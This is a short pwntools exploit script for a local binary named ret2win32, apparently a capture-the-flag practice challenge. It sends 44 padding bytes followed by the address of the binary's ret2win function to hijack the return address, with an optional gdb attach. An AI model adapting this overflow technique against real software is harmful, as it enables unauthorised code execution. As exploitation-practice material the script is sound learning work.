from pwn import *
context.terminal = ["tmux", "splitw", "-h"] #to open gdb vertically 
elf = ELF("./ret2win32")

gdbScript = '''
b main
'''

if args.GDB:
    p = process(elf.path)
    g = gdb.attach(p, gdbScript)
else:
    p = process(elf.path)



offset = b"A"*44

win = elf.sym['ret2win']

log.success("win addr: " + hex(win))

#Payload
payload = offset
payload += p32(win)

#Interaction
p.recvuntil(b"> ")
p.send(payload)
p.interactive()
